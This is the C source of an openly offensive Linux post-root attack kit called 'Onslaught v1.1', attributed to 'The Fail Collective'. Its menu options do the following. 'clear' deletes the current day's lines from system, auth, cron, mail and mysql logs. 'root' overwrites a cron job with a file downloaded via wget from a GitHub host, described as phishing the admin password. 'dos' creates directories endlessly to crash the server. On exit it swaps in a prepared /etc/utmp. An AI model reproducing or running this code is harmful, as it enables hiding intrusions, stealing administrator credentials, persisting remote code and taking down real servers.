/*
_________ _______  _______ 
\__   __/(  ____ \(  ____ \
   ) (   | (    \/| (    \/
   | |   | (__    | |      
   | |   |  __)   | |      
   | |   | (      | |      
   | |   | )      | (____/\
   )_(   |/       (_______/
[*]The Fail Collective's 
[*]Post root linux attack kit
[*]dubbed Onslaught v1.1
[+]added dos command to flood the server internally
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

FILE *fpipe;
char time[123]="date",option[132],options[132],command[132],variable[6][132],line[256],timeline[256],times[256],commander[132];
int for_loop = 0, x = 0;
main()
{
do {
  printf (">> ");
  if (fgets(line, sizeof(line), stdin)) {
 		if (1 == sscanf(line, "%s", option)) {
			strcpy(options, line);
		}
	}

		//get system time
		if ( !(fpipe = (FILE*)popen(time,"r")) )
                {
                        perror("Problems with command");
                }

                while ( fgets( timeline, sizeof timeline, fpipe))
                {
			strncpy(times, timeline,10);
                	strcpy(timeline, &times[4]);
		}
        	pclose(fpipe);

	if (strcmp(option, "clear") == 0)
	{
		strcpy(command, "grep -v '");
		strcat(command, timeline);
		strcpy(commander, command);
		strcpy(variable[0], "' /var/log/message > t.fc; mv t.fc /var/log/message");
		strcpy(variable[1], "' /var/log/auth.log > t.fc; mv t.fc /var/log/auth.log");
		strcpy(variable[2], "' /var/log/kern.log > t.fc; mv t.fc /var/log/kern.log");
		strcpy(variable[3], "' /var/log/cron.log > t.fc; mv t.fc /var/log/cron.log");
		strcpy(variable[4], "' /var/log/mail.log > t.fc; mv t.fc /var/log/mail.log");
		strcpy(variable[5], "' /var/log/mysql*.log > t.fc; mv t.fc /var/log/mysql.log");
		for (for_loop=0;for_loop<6;for_loop++)
		{
			strcpy(command, commander);
			strcat(command, variable[for_loop]);
			if ( !(fpipe = (FILE*)popen(command,"r")) )
			{
				perror("Problems with command");
			}
			else
			{
				printf("running command %s\n", command);

			}
			pclose(fpipe);
		}

	}//end clear

	else if (strcmp(option, "root") == 0)
	{
		printf("[INFO]creating a fake cronjob(maybe)\n\nGetting cronjobs:\n");
		strcpy(command, "crontab -l");
		if ( !(fpipe = (FILE*)popen(command,"r")) )
                        {
                                perror("Problems with command");
                        }
		while ( fgets( line, sizeof line, fpipe))
	                {
				printf("%s", line);
			}
                	pclose(fpipe);
		printf("\nInput the location of the editabe cronjob(if no jobs leave blank): ");

		if (fgets(line, sizeof(line), stdin)) {
	                if (1 == sscanf(line, "%s", variable[0])) {
                	}
		}
		strcpy(command, "cp ");
		strcat(command, variable[0]);
		strcat(command, " ");
		strcat(command, variable[0]);
		strcat(command, ".tmp");
		if ( !(fpipe = (FILE*)popen(command,"r")) )
                {
                        perror("Problems with command");
                }

                while ( fgets( line, sizeof line, fpipe))
                {
                        printf("%s", line);

                }
                pclose(fpipe); // close backup create pipe
		strcpy(command, "wget ");
		strcpy(variable[1], "raw.github.com/TheFailCollective/TFClean/master/cron -O ");
		strcat(variable[1], variable[0]);
		strcat(command, variable[1]);
		if ( !(fpipe = (FILE*)popen(command,"r")) )
        {
        	perror("Problems with command");
        }

        while ( fgets( line, sizeof line, fpipe))
        {
       		printf("%s", line);
        }
        pclose(fpipe); //close wget pipe

		strcpy(command, "chmod +x ");
		strcat(command, variable[0]);
		if ( !(fpipe = (FILE*)popen(command,"r")) )
                {
                        perror("Problems with command");
                }

                while ( fgets( line, sizeof line, fpipe))
                {
                        printf("%s", line);
                }
                pclose(fpipe);//close chmod pipe

        }



	else if (strcmp(option, "exit") == 0)
	{
		x = 1;
	}//end exit

	else if (strcmp(option, "help") == 0)
	{
		printf("clear - clears the logs\nroot - sets up a cron job to phish admin password\nexit - exits the program\nbash - starts bash(use exit to return to this program)\ndos - will create directories untill the server crashes(use with caution)\n");
	}//end help
	else if (strcmp(option, "dos") == 0)
	{
		int y = 0;
		char why[232];
		do {

			strcpy(options, "mkdir ");
			sprintf(why, "%d", y);
			strcat(options, why);
			if ( !(fpipe = (FILE*)popen(options,"r")) )
			{
				perror("Problems with command");
			}

			while ( fgets( line, sizeof line, fpipe))
			{
				printf("%s", line);

			}
			pclose(fpipe);
			printf("creating directory with the name of %s\n", why);
			y = y + 1;
		}while (x < 1);

	}


	else
	{
		if ( !(fpipe = (FILE*)popen(options,"r")) )
                {
                        perror("Problems with command");
                }

		while ( fgets( line, sizeof line, fpipe))
                {
			printf("%s", line);

		}
                pclose(fpipe);
	}//end else


}while (x < 1); //end first while
strcpy(options, "mv /etc/utmp.tfc /etc/utmp");
		if ( !(fpipe = (FILE*)popen(options,"r")) )
		{
			perror("Problems with command");
		}


return 0;
}
